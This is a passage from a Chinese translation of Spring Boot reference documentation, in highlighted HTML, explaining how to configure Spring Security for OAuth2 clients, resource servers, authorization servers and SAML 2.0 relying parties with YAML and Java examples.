    <span class="token keyword">public</span> <span class="token class-name">SecurityWebFilterChain</span> <span class="token function">springSecurityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">ServerHttpSecurity</span> http<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        http<span class="token punctuation">.</span><span class="token function">authorizeExchange</span><span class="token punctuation">(</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{<!-- --></span>
            exchange<span class="token punctuation">.</span><span class="token function">matchers</span><span class="token punctuation">(</span><span class="token class-name">PathRequest</span><span class="token punctuation">.</span><span class="token function">toStaticResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">atCommonLocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exchange<span class="token punctuation">.</span><span class="token function">pathMatchers</span><span class="token punctuation">(</span><span class="token string">"/foo"</span><span class="token punctuation">,</span> <span class="token string">"/bar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        http<span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token function">withDefaults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h4><a id="OAuth2_1088"></a>OAuth2</h4> 
<p><a href="https://oauth.net/2/" rel="nofollow">https://oauth.net/2/</a>OAuth2 是一个广泛使用的授权框架，由 Spring 提供支持。</p> 
<h5><a id="Client_1090"></a>Client</h5> 
<p>如果你的类路径上有 <code>spring-security-oauth2-client</code>，你就可以利用一些自动配置来设置 OAuth2/Open ID Connect 客户端。该配置使用 <code>OAuth2ClientProperties</code> 下的属性。同样的属性适用于 servlet 和反应式应用程序。<br> 您可以在 <code>spring.security.oauth2.client</code> 前缀下注册多个 OAuth2 客户端和提供程序，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">client</span><span class="token punctuation">:</span>
        <span class="token key atrule">registration</span><span class="token punctuation">:</span>
          <span class="token key atrule">my-login-client</span><span class="token punctuation">:</span>
            <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"abcd"</span>
            <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"password"</span>
            <span class="token key atrule">client-name</span><span class="token punctuation">:</span> <span class="token string">"Client for OpenID Connect"</span>
            <span class="token key atrule">provider</span><span class="token punctuation">:</span> <span class="token string">"my-oauth-provider"</span>
            <span class="token key atrule">scope</span><span class="token punctuation">:</span> <span class="token string">"openid,profile,email,phone,address"</span>
            <span class="token key atrule">redirect-uri</span><span class="token punctuation">:</span> <span class="token string">"{baseUrl}/login/oauth2/code/{registrationId}"</span>
            <span class="token key atrule">client-authentication-method</span><span class="token punctuation">:</span> <span class="token string">"client_secret_basic"</span>
            <span class="token key atrule">authorization-grant-type</span><span class="token punctuation">:</span> <span class="token string">"authorization_code"</span>

          <span class="token key atrule">my-client-1</span><span class="token punctuation">:</span>
            <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"abcd"</span>
            <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"password"</span>
            <span class="token key atrule">client-name</span><span class="token punctuation">:</span> <span class="token string">"Client for user scope"</span>
            <span class="token key atrule">provider</span><span class="token punctuation">:</span> <span class="token string">"my-oauth-provider"</span>
            <span class="token key atrule">scope</span><span class="token punctuation">:</span> <span class="token string">"user"</span>
            <span class="token key atrule">redirect-uri</span><span class="token punctuation">:</span> <span class="token string">"{baseUrl}/authorized/user"</span>
            <span class="token key atrule">client-authentication-method</span><span class="token punctuation">:</span> <span class="token string">"client_secret_basic"</span>
            <span class="token key atrule">authorization-grant-type</span><span class="token punctuation">:</span> <span class="token string">"authorization_code"</span>

          <span class="token key atrule">my-client-2</span><span class="token punctuation">:</span>
            <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"abcd"</span>
            <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"password"</span>
            <span class="token key atrule">client-name</span><span class="token punctuation">:</span> <span class="token string">"Client for email scope"</span>
            <span class="token key atrule">provider</span><span class="token punctuation">:</span> <span class="token string">"my-oauth-provider"</span>
            <span class="token key atrule">scope</span><span class="token punctuation">:</span> <span class="token string">"email"</span>
            <span class="token key atrule">redirect-uri</span><span class="token punctuation">:</span> <span class="token string">"{baseUrl}/authorized/email"</span>
            <span class="token key atrule">client-authentication-method</span><span class="token punctuation">:</span> <span class="token string">"client_secret_basic"</span>
            <span class="token key atrule">authorization-grant-type</span><span class="token punctuation">:</span> <span class="token string">"authorization_code"</span>

        <span class="token key atrule">provider</span><span class="token punctuation">:</span>
          <span class="token key atrule">my-oauth-provider</span><span class="token punctuation">:</span>
            <span class="token key atrule">authorization-uri</span><span class="token punctuation">:</span> <span class="token string">"https://my-auth-server.com/oauth2/authorize"</span>
            <span class="token key atrule">token-uri</span><span class="token punctuation">:</span> <span class="token string">"https://my-auth-server.com/oauth2/token"</span>
            <span class="token key atrule">user-info-uri</span><span class="token punctuation">:</span> <span class="token string">"https://my-auth-server.com/userinfo"</span>
            <span class="token key atrule">user-info-authentication-method</span><span class="token punctuation">:</span> <span class="token string">"header"</span>
            <span class="token key atrule">jwk-set-uri</span><span class="token punctuation">:</span> <span class="token string">"https://my-auth-server.com/oauth2/jwks"</span>
            <span class="token key atrule">user-name-attribute</span><span class="token punctuation">:</span> <span class="token string">"name"</span>
</code></pre> 
<p>对于支持 OpenID Connect 发现的 OpenID Connect 提供程序，配置可以进一步简化。提供程序需要配置一个 <code>issuer-uri</code>，也就是作为其发行者标识符的 URI。例如，如果提供的<code>issuer-uri</code> 是 “https://example.com”，那么将向 “https://example.com/.well-known/openid-configuration” 发出 “OpenID 提供者配置请求”。结果将是一个 “OpenID 提供商配置响应”。下面的示例显示了如何使用<code>issuer-uri</code> 配置 OpenID Connect 提供程序：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">client</span><span class="token punctuation">:</span>
        <span class="token key atrule">provider</span><span class="token punctuation">:</span>
          <span class="token key atrule">oidc-provider</span><span class="token punctuation">:</span>
            <span class="token key atrule">issuer-uri</span><span class="token punctuation">:</span> <span class="token string">"https://dev-123456.oktapreview.com/oauth2/default/"</span>
</code></pre> 
<p>默认情况下，Spring Security 的 <code>OAuth2LoginAuthenticationFilter</code> 只处理与 <code>/login/oauth2/code/*</code> 匹配的 URL。如果要自定义<code>redirect-uri</code> 以使用不同的模式，则需要提供配置来处理该自定义模式。例如，对于 servlet 应用程序，您可以添加自己的 <code>SecurityFilterChain</code>，类似于以下内容：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">HttpSecurity</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span></span><span class="token class-name">EnableWebSecurity</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">SecurityFilterChain</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@EnableWebSecurity</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyOAuthClientConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{<!-- --></span>
        http
            <span class="token punctuation">.</span><span class="token function">authorizeHttpRequests</span><span class="token punctuation">(</span><span class="token punctuation">(</span>requests<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> requests
                <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">oauth2Login</span><span class="token punctuation">(</span><span class="token punctuation">(</span>login<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> login
                <span class="token punctuation">.</span><span class="token function">redirectionEndpoint</span><span class="token punctuation">(</span><span class="token punctuation">(</span>endpoint<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> endpoint
                    <span class="token punctuation">.</span><span class="token function">baseUri</span><span class="token punctuation">(</span><span class="token string">"/login/oauth2/callback/*"</span><span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>Spring Boot 会自动配置一个 <code>InMemoryOAuth2AuthorizedClientService</code>，由 Spring Security 用于管理客户端注册。<code>InMemoryOAuth2AuthorizedClientService</code> 功能有限，建议仅在开发环境中使用。对于生产环境，请考虑使用 <code>JdbcOAuth2AuthorizedClientService</code> 或创建自己的 <code>OAuth2AuthorizedClientService</code> 实现。</p> 
</blockquote> 
<h6><a id="_OAuth2__1178"></a>通用提供商的 OAuth2 客户端注册</h6> 
<p>对于常见的 OAuth2 和 OpenID 提供商，包括 Google、Github、Facebook 和 Okta，我们提供了一组提供商默认值（分别为 Google、Github、Facebook 和 Okta）。<br> 如果不需要自定义这些提供程序，可以将提供程序属性设置为需要推断默认值的提供程序。此外，如果客户端注册的密钥与默认支持的提供程序相匹配，Spring Boot 也会推断出该提供程序。<br> 换句话说，下面示例中的两个配置都使用了 Google 提供程序：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">client</span><span class="token punctuation">:</span>
        <span class="token key atrule">registration</span><span class="token punctuation">:</span>
          <span class="token key atrule">my-client</span><span class="token punctuation">:</span>
            <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"abcd"</span>
            <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"password"</span>
            <span class="token key atrule">provider</span><span class="token punctuation">:</span> <span class="token string">"google"</span>
          <span class="token key atrule">google</span><span class="token punctuation">:</span>
            <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"abcd"</span>
            <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"password"</span>
</code></pre> 
<h5><a id="_1196"></a>资源服务器</h5> 
<p>如果您的类路径上有 <code>spring-security-oauth2-resource-server</code>，Spring Boot 就能设置 OAuth2 资源服务器。对于 JWT 配置，需要指定 JWK Set URI 或 OIDC Issuer URI，如以下示例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">resourceserver</span><span class="token punctuation">:</span>
        <span class="token key atrule">jwt</span><span class="token punctuation">:</span>
          <span class="token key atrule">jwk-set-uri</span><span class="token punctuation">:</span> <span class="token string">"https://example.com/oauth2/default/v1/keys"</span>
</code></pre> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">resourceserver</span><span class="token punctuation">:</span>
        <span class="token key atrule">jwt</span><span class="token punctuation">:</span>
          <span class="token key atrule">issuer-uri</span><span class="token punctuation">:</span> <span class="token string">"https://dev-123456.oktapreview.com/oauth2/default/"</span>
</code></pre> 
<blockquote> 
 <p>如果授权服务器不支持 JWK Set URI，则可使用用于验证 JWT 签名的公钥配置资源服务器。这可以使用 <code>spring.security.oauth2.resourceserver.jwt.public-key-location</code> 属性来完成，该属性的值需要指向一个包含 PEM 编码 x509 格式公钥的文件。</p> 
</blockquote> 
<p><code>spring.security.oauth2.resourceserver.jwt.audiences</code> 属性可用于指定 JWT 中 aud claim 的预期值。例如，要求 JWT 包含值为 <code>my-audience</code> 的 aud 声明：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">resourceserver</span><span class="token punctuation">:</span>
        <span class="token key atrule">jwt</span><span class="token punctuation">:</span>
          <span class="token key atrule">audiences</span><span class="token punctuation">:</span>
            <span class="token punctuation">-</span> <span class="token string">"my-audience"</span>
</code></pre> 
<p>同样的属性适用于 servlet 和反应式应用程序。另外，您也可以为 servlet 应用程序定义自己的 <code>JwtDecoder</code> Bean，或为反应式应用程序定义 <code>ReactiveJwtDecoder</code>。<br> 在使用不透明令牌而不是 JWT 的情况下，您可以配置以下属性，通过自省来验证令牌：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">resourceserver</span><span class="token punctuation">:</span>
        <span class="token key atrule">opaquetoken</span><span class="token punctuation">:</span>
          <span class="token key atrule">introspection-uri</span><span class="token punctuation">:</span> <span class="token string">"https://example.com/check-token"</span>
          <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"my-client-id"</span>
          <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"my-client-secret"</span>
</code></pre> 
<p>同样，相同的属性适用于 servlet 和反应式应用程序。另外，你也可以为 servlet 应用程序定义自己的 <code>OpaqueTokenIntrospector</code> Bean，或为反应式应用程序定义 <code>ReactiveOpaqueTokenIntrospector</code>。</p> 
<h5><a id="_1239"></a>认证服务器</h5> 
<p>如果你的类路径上有<code> spring-security-oauth2-authorization-server</code>，你就可以利用一些自动配置来设置基于 Servlet 的 OAuth2 授权服务器。<br> 你可以在 <code>spring.security.oauth2.authorizationserver.client</code> 前缀下注册多个 OAuth2 客户端，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">oauth2</span><span class="token punctuation">:</span>
      <span class="token key atrule">authorizationserver</span><span class="token punctuation">:</span>
        <span class="token key atrule">client</span><span class="token punctuation">:</span>
          <span class="token key atrule">my-client-1</span><span class="token punctuation">:</span>
            <span class="token key atrule">registration</span><span class="token punctuation">:</span>
              <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"abcd"</span>
              <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"{noop}secret1"</span>
              <span class="token key atrule">client-authentication-methods</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token string">"client_secret_basic"</span>
              <span class="token key atrule">authorization-grant-types</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token string">"authorization_code"</span>
                <span class="token punctuation">-</span> <span class="token string">"refresh_token"</span>
              <span class="token key atrule">redirect-uris</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token string">"https://my-client-1.com/login/oauth2/code/abcd"</span>
                <span class="token punctuation">-</span> <span class="token string">"https://my-client-1.com/authorized"</span>
              <span class="token key atrule">scopes</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token string">"openid"</span>
                <span class="token punctuation">-</span> <span class="token string">"profile"</span>
                <span class="token punctuation">-</span> <span class="token string">"email"</span>
                <span class="token punctuation">-</span> <span class="token string">"phone"</span>
                <span class="token punctuation">-</span> <span class="token string">"address"</span>
            <span class="token key atrule">require-authorization-consent</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
          <span class="token key atrule">my-client-2</span><span class="token punctuation">:</span>
            <span class="token key atrule">registration</span><span class="token punctuation">:</span>
              <span class="token key atrule">client-id</span><span class="token punctuation">:</span> <span class="token string">"efgh"</span>
              <span class="token key atrule">client-secret</span><span class="token punctuation">:</span> <span class="token string">"{noop}secret2"</span>
              <span class="token key atrule">client-authentication-methods</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token string">"client_secret_jwt"</span>
              <span class="token key atrule">authorization-grant-types</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token string">"client_credentials"</span>
              <span class="token key atrule">scopes</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token string">"user.read"</span>
                <span class="token punctuation">-</span> <span class="token string">"user.write"</span>
            <span class="token key atrule">jwk-set-uri</span><span class="token punctuation">:</span> <span class="token string">"https://my-client-2.com/jwks"</span>
            <span class="token key atrule">token-endpoint-authentication-signing-algorithm</span><span class="token punctuation">:</span> <span class="token string">"RS256"</span>
</code></pre> 
<blockquote> 
 <p><code>client-secret</code>属性的格式必须与配置的密码编码器相匹配。<code>PasswordEncoder</code> 的默认实例通过 <code>PasswordEncoderFactories.createDelegatingPasswordEncoder()</code> 创建。</p> 
</blockquote> 
<p>Spring Boot 为 Spring Authorization Server 提供的自动配置是为快速上手而设计的。大多数应用程序都需要自定义，并需要定义多个 Bean 来覆盖自动配置。<br> 以下组件可定义为 Bean，以覆盖 Spring Authorization Server 特有的自动配置：</p> 
<ul><li><code>RegisteredClientRepository</code></li><li><code>AuthorizationServerSettings</code></li><li><code>SecurityFilterChain</code></li><li><code>com.nimbusds.jose.jwk.source.JWKSource&lt;com.nimbusds.jose.proc.SecurityContext&gt;</code></li><li><code>JwtDecoder</code></li></ul> 
<blockquote> 
 <p>Spring Boot 会自动配置一个 <code>InMemoryRegisteredClientRepository</code>，Spring 授权服务器使用它来管理注册客户端。<code>InMemoryRegisteredClientRepository</code> 的功能有限，建议仅在开发环境中使用。对于生产环境，请考虑使用 <code>JdbcRegisteredClientRepository</code> 或创建自己的 <code>RegisteredClientRepository</code> 实现。</p> 
</blockquote> 
<p>更多信息可参阅<a href="https://docs.spring.io/spring-authorization-server/reference/1.2/index.html" rel="nofollow">《Spring 授权服务器参考指南》</a>的 <a href="https://docs.spring.io/spring-authorization-server/reference/1.2/getting-started.html" rel="nofollow">“入门”</a> 章节。</p> 
<h4><a id="SAML_20_1294"></a>SAML 2.0</h4> 
<h5><a id="_1295"></a>依赖方</h5> 
<p>如果你的类路径上有 <code>spring-security-saml2-service-provider</code>，你就可以利用一些自动配置来设置 SAML 2.0 依赖方。该配置使用 <code>Saml2RelyingPartyProperties</code> 下的属性。<br> 可信赖方注册代表身份提供方（IDP）和服务提供商（SP）之间的配对配置。您可以在 <code>spring.security.saml2.relyingparty</code> 前缀下注册多个可信赖方，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">saml2</span><span class="token punctuation">:</span>
      <span class="token key atrule">relyingparty</span><span class="token punctuation">:</span>
        <span class="token key atrule">registration</span><span class="token punctuation">:</span>
          <span class="token key atrule">my-relying-party1</span><span class="token punctuation">:</span>
            <span class="token key atrule">signing</span><span class="token punctuation">:</span>
              <span class="token key atrule">credentials</span><span class="token punctuation">:</span>
              <span class="token punctuation">-</span> <span class="token key atrule">private-key-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-private-key"</span>
                <span class="token key atrule">certificate-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-certificate"</span>
            <span class="token key atrule">decryption</span><span class="token punctuation">:</span>
              <span class="token key atrule">credentials</span><span class="token punctuation">:</span>
              <span class="token punctuation">-</span> <span class="token key atrule">private-key-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-private-key"</span>
                <span class="token key atrule">certificate-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-certificate"</span>
            <span class="token key atrule">singlelogout</span><span class="token punctuation">:</span>
               <span class="token key atrule">url</span><span class="token punctuation">:</span> <span class="token string">"https://myapp/logout/saml2/slo"</span>
               <span class="token key atrule">response-url</span><span class="token punctuation">:</span> <span class="token string">"https://remoteidp2.slo.url"</span>
               <span class="token key atrule">binding</span><span class="token punctuation">:</span> <span class="token string">"POST"</span>
            <span class="token key atrule">assertingparty</span><span class="token punctuation">:</span>
              <span class="token key atrule">verification</span><span class="token punctuation">:</span>
                <span class="token key atrule">credentials</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token key atrule">certificate-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-verification-cert"</span>
              <span class="token key atrule">entity-id</span><span class="token punctuation">:</span> <span class="token string">"remote-idp-entity-id1"</span>
              <span class="token key atrule">sso-url</span><span class="token punctuation">:</span> <span class="token string">"https://remoteidp1.sso.url"</span>

          <span class="token key atrule">my-relying-party2</span><span class="token punctuation">:</span>
            <span class="token key atrule">signing</span><span class="token punctuation">:</span>
              <span class="token key atrule">credentials</span><span class="token punctuation">:</span>
              <span class="token punctuation">-</span> <span class="token key atrule">private-key-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-private-key"</span>
                <span class="token key atrule">certificate-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-certificate"</span>
            <span class="token key atrule">decryption</span><span class="token punctuation">:</span>
              <span class="token key atrule">credentials</span><span class="token punctuation">:</span>
              <span class="token punctuation">-</span> <span class="token key atrule">private-key-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-private-key"</span>
                <span class="token key atrule">certificate-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-certificate"</span>
            <span class="token key atrule">assertingparty</span><span class="token punctuation">:</span>
              <span class="token key atrule">verification</span><span class="token punctuation">:</span>
                <span class="token key atrule">credentials</span><span class="token punctuation">:</span>
                <span class="token punctuation">-</span> <span class="token key atrule">certificate-location</span><span class="token punctuation">:</span> <span class="token string">"path-to-other-verification-cert"</span>
              <span class="token key atrule">entity-id</span><span class="token punctuation">:</span> <span class="token string">"remote-idp-entity-id2"</span>
              <span class="token key atrule">sso-url</span><span class="token punctuation">:</span> <span class="token string">"https://remoteidp2.sso.url"</span>
              <span class="token key atrule">singlelogout</span><span class="token punctuation">:</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> <span class="token string">"https://remoteidp2.slo.url"</span>
                <span class="token key atrule">response-url</span><span class="token punctuation">:</span> <span class="token string">"https://myapp/logout/saml2/slo"</span>
                <span class="token key atrule">binding</span><span class="token punctuation">:</span> <span class="token string">"POST"</span>
</code></pre> 
<p>对于 SAML2 注销，Spring Security 的 <code>Saml2LogoutRequestFilter</code> 和 <code>Saml2LogoutResponseFilter</code> 默认只处理与 <code>/logout/saml2/slo</code> 匹配的 URL。如果要自定义 AP 发起注销请求时的 URL 或 AP 发送注销响应时的响应 URL，以使用不同的模式，则需要提供配置来处理该自定义模式。例如，对于 servlet 应用程序，您可以添加类似下面的 <code>SecurityFilterChain</code>：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">HttpSecurity</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">SecurityFilterChain</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">Customizer</span><span class="token punctuation">.</span><span class="token static">withDefaults</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySamlRelyingPartyConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{<!-- --></span>
        http<span class="token punctuation">.</span><span class="token function">authorizeHttpRequests</span><span class="token punctuation">(</span><span class="token punctuation">(</span>requests<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> requests<span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        http<span class="token punctuation">.</span><span class="token function">saml2Login</span><span class="token punctuation">(</span><span class="token function">withDefaults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        http<span class="token punctuation">.</span><span class="token function">saml2Logout</span><span class="token punctuation">(</span><span class="token punctuation">(</span>saml2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> saml2<span class="token punctuation">.</span><span class="token function">logoutRequest</span><span class="token punctuation">(</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> request<span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/SLOService.saml2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">logoutResponse</span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> response<span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/SLOService.saml2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="Spring_Session_1367"></a>Spring Session</h3> 
<p>Spring Boot 为各种数据存储提供了 Spring Session 自动配置功能。在构建 servlet 网络应用时，可以自动配置以下存储：</p> 
<ul><li>Redis</li><li>JDBC</li><li>Hazelcast</li><li>MongoDB</li></ul> 
